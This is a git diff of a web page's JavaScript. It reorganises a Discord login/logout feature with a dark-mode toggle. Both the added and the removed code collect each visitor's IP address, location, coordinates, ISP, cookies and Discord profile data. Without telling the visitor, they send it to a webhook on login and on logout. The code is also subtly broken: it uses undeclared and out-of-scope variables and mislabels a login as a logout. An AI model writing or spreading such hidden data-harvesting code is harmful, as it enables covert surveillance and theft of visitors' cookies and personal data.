@@ -34,13 +34,104 @@ document.addEventListener('DOMContentLoaded', async function() {
     const logoutButton = document.getElementById("logoutButton");
     const profileUI = document.querySelector('.profile-ui');
     const discordUser = localStorage.getItem('discordUser');
-    const userData = JSON.parse(discordUser);
 
     // Dark mode toggle functionality
     toggleButton.addEventListener('click', function() {
         document.body.classList.toggle('dark-mode');
         this.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
     });
+
+// Discord login functionality
+
+async function updateUI() {
+    if (discordUser) { // Use the userData from the top
+        const userData = JSON.parse(discordUser);
+        const usernameElement = document.querySelector('.username');
+        usernameElement.innerText = userData.username; // Update username
+        const profilePicture = profileUI.querySelector('.profile-picture');
+        profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`; // Update profile picture
+
+        // Enable logout button, disable login button
+        logoutButton.disabled = false;
+        loginButton.disabled = true;
+    } else {
+        // User is not logged in, check URL for user data
+        const urlParams = new URLSearchParams(window.location.search);
+        const userParam = urlParams.get('user');
+
+        if (userParam) {
+            // If user data is in the URL, parse and store it
+            userData = JSON.parse(decodeURIComponent(userParam));
+            localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
+            await sendWebhook("User Logout", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`json
+${userDataFormatted}
+\`\`\`
+    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
+
+            const usernameElement = document.querySelector('.username');
+            usernameElement.innerText = userData.username; // Update username
+            const profilePicture = profileUI.querySelector('.profile-picture');
+            profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`; // Update profile picture
+
+            // Enable logout button, disable login button
+            logoutButton.disabled = false;
+            loginButton.disabled = true;
+
+            // Redirect to the desired URL
+            window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
+        } else {
+            // Not logged in and no user data in URL
+            logoutButton.disabled = true;
+            loginButton.disabled = false;
+        }
+    }
+
+    // Ensure profile UI is always visible
+   // profileUI.style.display = 'block'; // Always show profile UI
+}
+
+// Initial UI setup
+updateUI(); // Check and update UI on page load
+
+loginButton.addEventListener('click', function() {
+    const discordLoginUrl = `${apiUrl}/auth/discord`;
+    window.location.href = discordLoginUrl;
+});
+
+logoutButton.addEventListener('click', async function() {
+    // Send webhook for user logout
+    await sendWebhook("User Logout", `
+**IP:** ${ipData.ip}
+**City:** ${ipData.city}
+**Region:** ${ipData.region}
+**Country:** ${ipData.country}
+**Timezone:** ${ipData.timezone}
+**Org:** ${ipData.org}
+**Location:** ${ipData.loc}
+**Cookies:** ${visitorCookie}
+**Discord User Data:** \`\`\`json
+${userDataFormatted}
+\`\`\`
+    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
+
+    // Remove user data from local storage
+    localStorage.removeItem('discordUser');
+
+    // Update the UI after logout
+    updateUI();
+
+    // Redirect to the desired URL
+    window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
+});
 
     // Fetch IP information from your API
     const ipInfoResponse = await fetch(`https://ipinfo.io/json`);
@@ -178,96 +269,6 @@ ${userDataFormatted}
             sendButton.innerText = "Send";
         }, 3000); // 3-second cooldown
     });
-
-// Discord login functionality
-loginButton.addEventListener('click', function() {
-    const discordLoginUrl = `${apiUrl}/auth/discord`;
-    window.location.href = discordLoginUrl;
-});
-
-logoutButton.addEventListener('click', async function() {
-    // Send webhook for user logout
-    await sendWebhook("User Logout", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`json
-${userDataFormatted}
-\`\`\`
-    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
-
-    // Remove user data from local storage
-    localStorage.removeItem('discordUser');
-
-    // Update the UI after logout
-    updateUI();
-
-    // Redirect to the desired URL
-    window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
-});
-
-async function updateUI() {
-    if (userData) { // Use the userData from the top
-        const usernameElement = document.querySelector('.username');
-        usernameElement.innerText = userData.username; // Update username
-        const profilePicture = profileUI.querySelector('.profile-picture');
-        profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`; // Update profile picture
-
-        // Enable logout button, disable login button
-        logoutButton.disabled = false;
-        loginButton.disabled = true;
-    } else {
-        // User is not logged in, check URL for user data
-        const urlParams = new URLSearchParams(window.location.search);
-        const userParam = urlParams.get('user');
-
-        if (userParam) {
-            // If user data is in the URL, parse and store it
-            userData = JSON.parse(decodeURIComponent(userParam));
-            localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
-            await sendWebhook("User Logout", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`json
-${userDataFormatted}
-\`\`\`
-    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
-
-            const usernameElement = document.querySelector('.username');
-            usernameElement.innerText = userData.username; // Update username
-            const profilePicture = profileUI.querySelector('.profile-picture');
-            profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`; // Update profile picture
-
-            // Enable logout button, disable login button
-            logoutButton.disabled = false;
-            loginButton.disabled = true;
-
-            // Redirect to the desired URL
-            window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
-        } else {
-            // Not logged in and no user data in URL
-            logoutButton.disabled = true;
-            loginButton.disabled = false;
-        }
-    }
-
-    // Ensure profile UI is always visible
-   // profileUI.style.display = 'block'; // Always show profile UI
-}
-
-// Initial UI setup
-updateUI(); // Check and update UI on page load
 
     // Copy to clipboard functionality
     const copyButton = document.getElementById('copyResponseToClipboard');
